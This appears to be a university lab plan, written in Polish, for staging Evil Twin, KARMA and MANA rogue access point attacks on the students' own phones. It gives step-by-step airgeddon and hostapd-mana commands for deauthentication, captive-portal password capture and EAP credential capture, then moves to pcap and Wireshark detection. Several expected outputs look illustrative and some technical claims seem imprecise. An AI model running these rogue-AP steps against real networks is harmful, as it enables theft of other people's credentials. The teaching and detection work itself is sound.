# Plan Praktyczny — Evil Twin / Rogue AP: Ataki KARMA, MANA, Analiza, Detekcja

> **Projekt:** BBSK-Evil-Twin | **Przedmiot:** Bezpieczeństwo Sieci Bezprzewodowych | **AGH WIEiT**
>
> v2.0 — rozszerzony o ataki KARMA i MANA

---

## ⏱ Szacowany czas całkowity: 150–180 minut

| Faza | Czas | Temat |
|---|---|---|
| **0. Przygotowanie** | 15 min | Sprawdzenie sprzętu, instalacja narzędzi (w tym hostapd-mana) |
| **1. Atak Evil Twin (klasyczny)** | 25 min | Airgeddon — deauth + captive portal |
| **2. Atak KARMA** | 25 min | hostapd-mana + probe response attack |
| **3. Atak MANA (zaawansowany)** | 25 min | hostapd-mana w trybie MANA — pełny rogue AP |
| **4. Analiza automatyczna** | 20 min | analyze_pcap.py + beacon_diff.py na wszystkich pcap |
| **5. Wireshark** | 20 min | Ręczna analiza IE, RSSI, seq dla każdego typu ataku |
| **6. Raport** | 15 min | generate_report.py + screenshoty |
| **7. Finalizacja** | 10 min | Konwersja do DOCX, weryfikacja |

---

## 📚 Teoria: Trzy typy ataków Rogue AP

### Atak 1: Evil Twin (klasyczny) — już opisany

- Atakujący klonuje **konkretny, znany SSID** (np. "AGH_Test")
- Wysyła ramki deauth do klientów oryginalnego AP
- Klient traci połączenie i łączy się z fałszywym AP
- Captive portal przechwytuje hasło

### Atak 2: KARMA (Karma Attacks Radio Machines Automatically)

**Mechanizm:**
1. Atakujący uruchamia rogue AP, który **nasłuchuje probe requestów** od klientów
2. Każdy klient (telefon/laptop) co jakiś czas wysyła probe requesty z nazwami sieci, do których wcześniej się łączył
3. KARMA AP **odpowiada na KAŻDY probe request** emitując beacon z żądanym SSID
4. Klient myśli: "O, znalazłem sieć którą znam!" i łączy się

**Kluczowa różnica od Evil Twin:** Nie musisz znać SSID-u z góry. KARMA łapie **wszystkie** klienty, których probe requesty usłyszy.

**Ograniczenia współczesne:**
- Nowe systemy (iOS 10+, Android 8+, Windows 10+) używają **pasywnego skanowania** dla znanych sieci — nie wysyłają probe requestów
- **Directed probe requests** — klient wysyła probe request do konkretnego BSSID, nie broadcast
- KARMA działa najlepiej na starszych urządzeniach lub gdy klient aktywnie szuka sieci

### Atak 3: MANA (MANA Toolkit — SensePost, Defcon 22)

**Ulepszenie KARMY** — rozwiązuje problem directed probe requestów:

1. hostapd-mana **odpowiada na wszystkie probe requesty**, nawet te skierowane do konkretnego BSSID (ignoruje adres docelowy)
2. Używa **wielu BSSID jednocześnie** — jeden fizyczny interfejs emuluje wiele AP
3. **Loud mode** — przesyła beacon dla każdego SSID z listy popularnych sieci
4. Przechwytuje **EAP handshake** dla sieci Enterprise
5. Automatyczne **cracking haseł** (asleap, JtR)

**MANA = KARMA na sterydach.** Działa nawet przeciwko współczesnym systemom.

---

## Faza 0 — Przygotowanie środowiska (rozszerzone)

### 0.1 ✅ Standardowe sprawdzenie

```bash
iw dev                           # Lista interfejsów
iw list | grep -A 15 "Supported interface modes"   # AP + monitor
ip link show wlan0 | grep "link/ether"              # MAC karta 1
ip link show wlan1 | grep "link/ether"              # MAC karta 2
```

### 0.2 ✅ Instalacja wszystkich narzędzi

```bash
sudo apt update
sudo apt upgrade -y

# Narzędzia podstawowe (były wcześniej)
sudo apt install airgeddon wireshark aircrack-ng python3-pip -y

# 🔥 NOWE: MANA toolkit (kluczowe dla KARMA i MANA!)
sudo apt install hostapd-mana mana-toolkit -y

# Sprawdzenie instalacji
which hostapd-mana
which berate_ap           # MANA AP script

# Python + nasze skrypty
pip3 install scapy matplotlib
```

**Oczekiwany wynik:**
```
/usr/bin/hostapd-mana
/usr/bin/berate_ap
```

### 0.3 ✅ Sprawdź działanie hostapd-mana

```bash
# Sprawdź wersję i dostępne opcje
hostapd-mana -v

# Lista dostępnych trybów (w pliku konfiguracyjnym)
ls /etc/mana-toolkit/
# Powinieneś zobaczyć: hostapd-mana.conf, hostapd-karma.conf, hostapd-mana-eaponly.conf
```

**Pliki konfiguracyjne MANA (na Kali):**
| Plik | Tryb | Opis |
|---|---|---|
| `hostapd-mana.conf` | MANA full | Odpowiada na wszystkie probe requesty |
| `hostapd-karma.conf` | KARMA only | Klasyczny atak KARMA |
| `hostapd-mana-eaponly.conf` | EAP-only | Przechwytywanie haseł EAP/Enterprise |

### 0.4 ✅ Konfiguracja telefonów

**Telefon A** — hotspot (oryginalny AP):
- SSID: `AGH_Test`, WPA2, 2.4 GHz, kanał 6

**Telefon B** — ofiara:
- Połączony z hotspotem A
- Dla testów KARMA: wcześniej połączony z kilkoma różnymi sieciami (np. "Starbucks_WiFi", "Hotel_Guest")

---

## Faza 1 — Klasyczny Evil Twin (Airgeddon) [~25 min]

_(To samo co w poprzedniej wersji — zostawiam skróconą wersję)_

### 1.1 Karta 1: Monitor + przechwytywanie

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon -c 6 -w /tmp/evil_twin_demo --output-format pcap
# Zostaw działające
```

### 1.2 Karta 2: Airgeddon

```bash
sudo airgeddon
# → [9] Evil Twin AP attacks → wybierz AGH_Test → captive portal
```

### 1.3 Obserwuj atak

Na telefonie B: deauth → reconnect → captive portal → wpisz hasło

### 1.4 Zatrzymaj i zapisz

`Ctrl+C` w airodump. Masz `/tmp/evil_twin_demo-01.pcap`.

📸 **Screenshot 1A:** Terminal airodump-ng
📸 **Screenshot 1B:** Airgeddon z przechwyconym hasłem
📸 **Screenshot 1C:** Captive portal na telefonie

---

## Faza 2 — Atak KARMA (hostapd-mana) [~25 min] 🔥 NOWE

### 2.1 Teoria w pigułce

```
Działanie KARMY:

1. Klient wysyła probe request: "Hej, czy jest tu sieć 'Starbucks_WiFi'?"
   ┌──────────┐  probe request (SSID=Starbucks_WiFi)   ┌──────────────┐
   │ Telefon B │ ─────────────────────────────────────▶ │ KARMA AP     │
   │ (ofiara)  │                                        │ (nasłuchuje) │
   └──────────┘                                        └──────┬───────┘
                                                              │
   2. KARMA AP odpowiada beaconem: "Tak! Jestem Starbucks_WiFi!"         │
   ┌──────────┐  beacon (SSID=Starbucks_WiFi)          ┌──────────────┐
   │ Telefon B │ ◀───────────────────────────────────── │ KARMA AP     │
   │           │                                        │              │
   └──────────┘                                        └──────────────┘

   3. Klient łączy się z KARMA AP myśląc że to znana sieć
```

**Kluczowa różnica:** Evil Twin atakuje JEDNĄ konkretną sieć. KARMA atakuje KAŻDEGO klienta w zasięgu, niezależnie od tego jakich SSID szuka.

### 2.2 Konfiguracja przed atakiem

```bash
# Sprawdź konfig KARMA
cat /etc/mana-toolkit/hostapd-karma.conf

# Powinieneś zobaczyć kluczowe opcje:
# enable_mana=0          (KARMA mode, nie MANA)
# interface=wlan1
# ssid=internet          (domyślny SSID jeśli żaden probe nie pasuje)
```

### 2.3 Uruchom przechwytywanie (osobny terminal)

```bash
# Terminal 1 — przechwytywanie na kanale 6
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon -c 6 -w /tmp/karma_demo --output-format pcap
# Zostaw działające
```

### 2.4 Uruchom atak KARMA

```bash
# Terminal 2 — KARMA AP
# Opcja A: Użyj skryptu berate_ap (najprostsza)
sudo berate_ap --karma wlan1 wlan0

# Opcja B: Ręcznie z hostapd-mana
sudo hostapd-mana /etc/mana-toolkit/hostapd-karma.conf

# Opcja C: Z pełną kontrolą parametrów
sudo hostapd-mana -B /etc/mana-toolkit/hostapd-karma.conf
```

**Oczekiwany output:**
```
Configuration file: /etc/mana-toolkit/hostapd-karma.conf
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED
KARMA: Probe request from XX:XX:XX:XX:XX:XX for SSID 'Starbucks_WiFi'
KARMA: Sending beacon for 'Starbucks_WiFi' to XX:XX:XX:XX:XX:XX
wlan1: STA XX:XX:XX:XX:XX:XX IEEE 802.11: associated
KARMA: Client XX:XX:XX:XX:XX:XX connected to 'Starbucks_WiFi'
```

### 2.5 Wygeneruj ruch od klienta

Na **Telefonie B**:
1. Wejdź w ustawienia Wi-Fi → zobaczysz "Starbucks_WiFi" jako dostępną sieć (jeśli telefon wcześniej się z nią łączył)
2. **LUB:** ręcznie wyszukaj sieci — telefon wyśle probe requesty, KARMA na nie odpowie
3. Spróbuj połączyć się z którąś z "fałszywych" sieci

**Alternatywnie — wygeneruj probe requesty sztucznie:**
```bash
# Na Kali, z drugiej karty (lub przed uruchomieniem KARMY)
sudo aireplay-ng wlan0mon --test
# Wyśle to mnóstwo probe requestów które KARMA przechwyci
```

### 2.6 Zatrzymaj i zapisz

`Ctrl+C` w obu terminalach.

Masz:
- `/tmp/karma_demo-01.pcap` — zawiera ramki z ataku KARMA

### 2.7 Czego się spodziewać — wnioski

Po ataku KARMA, w pliku pcap zobaczysz:
- **Wiele różnych SSID** nadawanych z tego samego BSSID (MAC karty Kali)
- **Probe requesty** od klientów → **Probe responsey** od KARMA AP
- Beacon frames z różnymi SSID ale tym samym BSSID
- **Brak ramek deauth** (KARMA nie robi deauth, w przeciwieństwie do Evil Twin)

📸 **Screenshot 2A:** Terminal hostapd-mana pokazujący przechwycone probe requesty
📸 **Screenshot 2B:** Wireshark — wiele SSID z tego samego BSSID (dowód KARMA)

**Porównanie KARMA vs Evil Twin:**
| Cecha | Evil Twin | KARMA |
|---|---|---|
| Cel | Jeden konkretny SSID | Wszystkie SSID z probe requestów |
| Deauth | ✅ Tak | ❌ Nie |
| Liczba SSID | 1 | Wiele |
| Wykrywanie | Duplikat SSID | 1 BSSID → wiele SSID |
| Skuteczność | Wysoka jeśli znasz SSID | Zależna od klientów w zasięgu |

---

## Faza 3 — Atak MANA (zaawansowany) [~25 min] 🔥 NOWE

### 3.1 Teoria w pigułce

MANA = KARMA + ulepszenia:
- Odpowiada na **directed probe requests** (ignoruje docelowy BSSID)
- **Loud mode** — co kilka sekund emituje beacon z popularnymi SSID
- **Multiple BSSID** — jeden fizyczny interfejs, wiele wirtualnych AP
- **EAP credential capture** — przechwytuje hasła z sieci Enterprise
- **Automatyczne łamanie** — integracja z asleap, hashcat

```
Działanie MANA (Loud Mode):

Co 10 sekund MANA AP emituje beacony z popularnymi SSID:
┌────────────┐
│ MANA AP    │ ── beacon SSID="Starbucks_WiFi" ──▶
│            │ ── beacon SSID="Hotel_Guest"   ──▶
│            │ ── beacon SSID="Airport_Free"  ──▶   ┌──────────┐
│            │ ── beacon SSID="eduroam"       ──▶   │ Telefon B │
│            │ ── beacon SSID="AGH_WiFi"      ──▶   │ (ofiara)  │
└────────────┘                                      └──────────┘

Telefon widzi "znane" sieci i automatycznie próbuje się połączyć.
Dodatkowo: MANA odpowiada na KAŻDY probe request (nawet directed).
```

### 3.2 Konfiguracja MANA

```bash
# Sprawdź konfig
cat /etc/mana-toolkit/hostapd-mana.conf

# Kluczowe opcje:
# enable_mana=1          ← MANA mode ON
# mana_loud=1            ← Loud mode: emituj popularne SSID
# interface=wlan1
# ssid=internet          ← domyślny SSID
```

**Plik z popularnymi SSID (loud mode):**
```bash
cat /usr/share/mana-toolkit/ssid-mana
# Możesz dodać własne SSID:
echo "AGH_WiFi" | sudo tee -a /usr/share/mana-toolkit/ssid-mana
echo "eduroam" | sudo tee -a /usr/share/mana-toolkit/ssid-mana
echo "Starbucks_WiFi" | sudo tee -a /usr/share/mana-toolkit/ssid-mana
```

### 3.3 Uruchom przechwytywanie

```bash
# Terminal 1 — airodump na kilku kanałach
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon -w /tmp/mana_demo --output-format pcap
# Zostaw działające
```

### 3.4 Uruchom MANA

```bash
# Terminal 2 — MANA AP (full mode)
sudo berate_ap --mana wlan1 wlan0

# LUB ręcznie:
sudo hostapd-mana /etc/mana-toolkit/hostapd-mana.conf

# Z loud mode:
sudo berate_ap --mana --loud wlan1 wlan0
```

**Oczekiwany output:**
```
MANA: Starting with loud mode (24 SSIDs loaded)
wlan1: AP-ENABLED
MANA: Loud beacon batch sent (SSIDs: internet, eduroam, Starbucks_WiFi, ...)
MANA: Directed probe from XX:XX:XX:XX:XX:XX for SSID 'Hotel_Guest' to BSSID YY:YY:YY:YY:YY:YY
MANA: Responding with beacon (ignoring BSSID)
wlan1: STA XX:XX:XX:XX:XX:XX associated (SSID 'Hotel_Guest')
MANA: EAP handshake captured for XX:XX:XX:XX:XX:XX (identity: user@domain)
```

### 3.5 Obserwuj atak

Na **Telefonie B**:
1. Jeśli telefon ma włączone Wi-Fi — zobaczysz listę "znajomych" sieci (te z loud list)
2. Telefon może automatycznie połączyć się z którąś z nich
3. W terminalu MANA zobaczysz logi połączeń

### 3.6 Zatrzymaj i zapisz

`Ctrl+C` w obu terminalach. Masz `/tmp/mana_demo-01.pcap`.

### 3.7 Czego się spodziewać — wnioski

Po ataku MANA, w pliku pcap zobaczysz:
- **Jeden BSSID → wiele SSID** w beaconach (Loud Mode)
- **Probe response** nawet dla directed probe requestów
- **Brak deauth** (MANA czeka aż klient sam się połączy)
- Ewentualnie **EAP handshake** (jeśli celował w Enterprise)
- **Więcej połączeń** niż przy klasycznym KARMA (bo loud mode)

📸 **Screenshot 3A:** Terminal z MANA pokazujący loud beacony + połączenia
📸 **Screenshot 3B:** Wireshark — beacon z wieloma SSID (ten sam BSSID)

**Porównanie KARMA vs MANA:**
| Cecha | KARMA | MANA |
|---|---|---|
| Probe response | Tak, na broadcast probe | Tak, na **każdy** probe (nawet directed) |
| Loud mode | ❌ | ✅ Emituje popularne SSID |
| Multiple BSSID | ❌ | ✅ |
| EAP capture | ❌ | ✅ |
| Skuteczność | Niska na nowych OS | Wysoka nawet na nowych OS |

---

## Faza 4 — Analiza automatyczna wszystkich ataków [~20 min]

### 4.1 Analiza Evil Twin

```bash
python3 skrypty/analyze_pcap.py /tmp/evil_twin_demo-01.pcap AGH_Test \
    --json --csv -o ./wyniki/evil_twin/
```

**Oczekiwany output:**
```
[!] UWAGA: 2 urządzeń nadaje z SSID='AGH_Test'
    To jest wskaźnik ataku Evil Twin!

AP #1 ... Vendor Specific: Apple
AP #2 ... Vendor Specific: Ralink/MediaTek (RT5572)
```

### 4.2 Analiza KARMA

```bash
python3 skrypty/analyze_pcap.py /tmp/karma_demo-01.pcap \
    --json --csv -o ./wyniki/karma/

# Porównaj konkretne BSSID (MAC karty #2)
python3 skrypty/beacon_diff.py /tmp/karma_demo-01.pcap \
    --bssid1 <MAC_KARTY_2> --bssid2 <MAC_DOWOLNEGO_INNEGO_AP> \
    --json --markdown -o ./wyniki/karma/
```

**Oczekiwany output:**
```
AP #1:
  BSSID: XX:XX:XX:XX:XX:02
  SSID: Starbucks_WiFi
  ...
  SSID: Hotel_Guest       ← Ten sam BSSID, INNY SSID!
  SSID: Airport_Free      ← To jest anomalia KARMA!
```

**Wniosek:** Jeden BSSID nadający wiele różnych SSID = KARMA/MANA. Evil Twin nadajełby wiele BSSID z tym samym SSID.

### 4.3 Analiza MANA

```bash
python3 skrypty/analyze_pcap.py /tmp/mana_demo-01.pcap \
    --json --csv -o ./wyniki/mana/
```

**Oczekiwany output:**
```
AP #1:
  BSSID: XX:XX:XX:XX:XX:02
  Ramki Beacon: 500+
  Wiele SSID: internet, eduroam, Starbucks_WiFi, AGH_WiFi, ...
```

### 4.4 Porównanie trzech ataków

```bash
# Wygeneruj raporty porównawcze z beacon_diff.py
# Dla każdego ataku porównaj charakterystykę BSSID
cat wyniki/evil_twin/evil_twin_analysis.json | python3 -m json.tool | head -30
cat wyniki/karma/evil_twin_analysis.json | python3 -m json.tool | head -30
cat wyniki/mana/evil_twin_analysis.json | python3 -m json.tool | head -30
```

**Matryca detekcji — porównanie fingerprintów:**

| Metoda | Evil Twin (co widzisz) | KARMA (co widzisz) | MANA (co widzisz) |
|---|---|---|---|
| **SSID vs BSSID** | 2+ BSSID → 1 SSID (✅ wykryte) | 1 BSSID → wiele SSID (⚠️ anomalia) | 1 BSSID → wiele SSID (⚠️ anomalia) |
| **Supported Rates** | Różne między AP | Takie same (ten sam sprzęt) | Takie same (ten sam sprzęt) |
| **Vendor Specific** | Różne OUI | Ten sam OUI | Ten sam OUI |
| **Sequence Numbers** | Dwa strumienie (✅ dowód) | Jeden strumień (1 urządzenie) | Jeden strumień (1 urządzenie) |
| **RSSI** | Skok sygnału | Stały poziom | Stały poziom |
| **Deauth frames** | Obecne | Brak | Brak |
| **Loud beacony** | Brak | Brak (chyba że ręcznie) | ✅ Obecne (co ~10s) |

---

## Faza 5 — Analiza ręczna w Wireshark [~20 min]

### 5.1 Otwórz wszystkie pliki

```bash
wireshark /tmp/evil_twin_demo-01.pcap &
wireshark /tmp/karma_demo-01.pcap &
wireshark /tmp/mana_demo-01.pcap &
```

### 5.2 Evil Twin — filtry

```
# Ramki Beacon z konkretnym SSID
wlan.fc.type_subtype == 8 && wlan.ssid == "AGH_Test"

# Dwa BSSID z tym samym SSID = Evil Twin
# Porównaj Tagged parameters → Vendor Specific
```

### 5.3 KARMA — filtry

```
# Wszystkie ramki Beacon z BSSID karty #2
wlan.fc.type_subtype == 8 && wlan.bssid == XX:XX:XX:XX:XX:02

# Zauważ: jeden BSSID, wiele SSID
# Dodaj kolumnę SSID: Edit → Preferences → Columns → Add → wlan.ssid

# Probe requesty od klientów
wlan.fc.type_subtype == 4

# Probe responsey od KARMA AP
wlan.fc.type_subtype == 5
```

📸 **Screenshot 5A:** Kolumna SSID pokazująca wiele sieci z jednego BSSID

### 5.4 MANA — filtry

```
# Loud beacony — wiele SSID w krótkim czasie
wlan.fc.type_subtype == 8 && wlan.bssid == XX:XX:XX:XX:XX:02
# Posortuj po czasie — zobaczysz serie beaconów z różnymi SSID co ~10s

# Directed probe response
wlan.fc.type_subtype == 5 && wlan.da == XX:XX:XX:XX:XX:02
```

📸 **Screenshot 5B:** Wireshark — seria beaconów MANA (Loud mode)

### 5.5 Porównanie wizualne — macierz różnic

| Obserwacja | Evil Twin | KARMA | MANA |
|---|---|---|---|
| **Liczba BSSID z tym SSID** | ≥2 | 1 | 1 |
| **Liczba SSID z tego BSSID** | 1 | Wiele | Wiele |
| **Vendor Specific** | Różne | Ten sam | Ten sam |
| **Deauth obecne** | Tak | Nie | Nie |
| **Beacony co ~10s z różnymi SSID** | Nie | Nie | Tak |

---

## Faza 6 — Raport końcowy [~15 min]

### 6.1 Generuj raport

```bash
python3 skrypty/generate_report.py \
    --analyze-json wyniki/evil_twin/evil_twin_analysis.json \
    --diff-json wyniki/evil_twin/beacon_diff.json \
    --autorzy "Piotr Straszak, [TWOJE IMIĘ]" \
    --przedmiot "Bezpieczeństwo Sieci Bezprzewodowych" \
    --ssid "AGH_Test" \
    -o raport_koncowy.md
```

### 6.2 Dodaj sekcje o KARMA i MANA

Raport będzie zawierał:
- Sekcję 1-2: Introduction + Environment setup
- Sekcję 3: Evil Twin (klasyczny)
- **Sekcję 4: KARMA attack** (NOWA)
- **Sekcję 5: MANA attack** (NOWA)
- Sekcję 6: Detection methods comparison
- Sekcję 7: Conclusions

### 6.3 Konwersja

```bash
pandoc raport_koncowy.md -o raport_koncowy.docx --from markdown --to docx
```

---

## Faza 7 — Finalizacja [~10 min]

### 7.1 Checklista końcowa (rozszerzona)

- [ ] Evil Twin: plik `.pcap` z dwoma BSSID dla tego samego SSID ✅
- [ ] KARMA: plik `.pcap` z jednym BSSID → wiele SSID ✅
- [ ] MANA: plik `.pcap` z loud beaconami + wiele SSID ✅
- [ ] analyze_pcap.py wykrył Evil Twin (ostrzeżenie)
- [ ] analyze_pcap.py pokazał wiele SSID dla KARMA/MANA
- [ ] beacon_diff.py: porównanie IE dla Evil Twin (różne OUI)
- [ ] beacon_diff.py: porównanie IE dla KARMA (ten sam OUI)
- [ ] Wireshark: porównanie IE, RSSI, seq dla wszystkich 3 ataków
- [ ] Screenshoty: minimum 11 screenshotów (po 3-4 na każdy atak)
- [ ] Raport końcowy .docx z wszystkimi sekcjami

### 7.2 Struktura końcowa plików

```
BBSK-Evil-Twin/
├── raport_koncowy.md
├── raport_koncowy.docx
├── wyniki/
│   ├── evil_twin/
│   │   ├── evil_twin_analysis.json
│   │   └── beacon_diff.json
│   ├── karma/
│   │   ├── evil_twin_analysis.json
│   │   └── beacon_diff.json
│   └── mana/
│       ├── evil_twin_analysis.json
│       └── beacon_diff.json
├── screenshoty/
│   ├── 01a_airodump.png
│   ├── 01b_airgeddon.png
│   ├── 01c_captive_portal.png
│   ├── 02a_karma_probes.png
│   ├── 02b_karma_wireshark.png
│   ├── 03a_mana_loud.png
│   ├── 03b_mana_wireshark.png
│   ├── 04_evil_twin_analiza.png
│   ├── 05_karma_analiza.png
│   ├── 06_mana_analiza.png
│   └── 07_wireshark_comparison.png
└── przechwycony_ruch/
    ├── evil_twin_demo-01.pcap
    ├── karma_demo-01.pcap
    └── mana_demo-01.pcap
```

---

## 🆘 Troubleshooting (rozszerzone)

| Problem | Rozwiązanie |
|---|---|
| `hostapd-mana: command not found` | `sudo apt install hostapd-mana -y` |
| `berate_ap: command not found` | `sudo apt install mana-toolkit -y` |
| KARMA nie widzi probe requestów | Spróbuj ręcznie wyszukać sieci na telefonie. Starsze telefony działają lepiej. |
| MANA — loud mode nie działa | Sprawdź plik `/usr/share/mana-toolkit/ssid-mana`. Dodaj własne SSID. |
| Klient nie łączy się automatycznie | Współczesne OS blokują auto-connect do otwartych sieci. Użyj telefonu jako ofiary (mniej restrykcyjne). |
| `Resource busy` przy hostapd | `sudo airmon-ng check kill` — zabij NetworkManager przed uruchomieniem. |

---

## 📊 Tabela podsumowująca — 3 ataki

|  | Evil Twin (Airgeddon) | KARMA (hostapd-mana) | MANA (hostapd-mana) |
|---|---|---|---|
| **Narzędzie** | airgeddon | hostapd-mana (tryb KARMA) | hostapd-mana (tryb MANA) |
| **Cel** | 1 konkretny SSID | Wszystkie SSID z probe req. | Wszystkie SSID (probe + loud) |
| **Deauth** | ✅ Tak | ❌ Nie | ❌ Nie |
| **BSSID** | 2+ różne BSSID | 1 BSSID | 1 BSSID |
| **SSID/BSSID** | 1 SSID → wiele BSSID | Wiele SSID → 1 BSSID | Wiele SSID → 1 BSSID |
| **Wykrywanie IE** | Różne OUI ✅ | Ten sam OUI | Ten sam OUI |
| **Wykrywanie seq** | 2 strumienie ✅ | 1 strumień | 1 strumień |
| **Wykrywanie RSSI** | Skok ✅ | Stały | Stały |
| **Dowód ataku** | Duplikat SSID + różne OUI | 1 BSSID → wiele SSID | Loud beacony + wiele SSID |
| **Skuteczność** | Wysoka (znasz SSID) | Średnia (nowe OS) | Wysoka (nawet nowe OS) |

---

> 🔥 **Kluczowe rozróżnienie dla detekcji:**
> - **Evil Twin:** WIELE BSSID → TEN SAM SSID (klonowanie konkretnej sieci)
> - **KARMA/MANA:** JEDEN BSSID → WIELE SSID (odpowiadanie na wszystkie probe requesty)
>
> To fundamentalnie różne anomalie w powietrzu. Oba są wykrywalne przez analizę beacon frames.
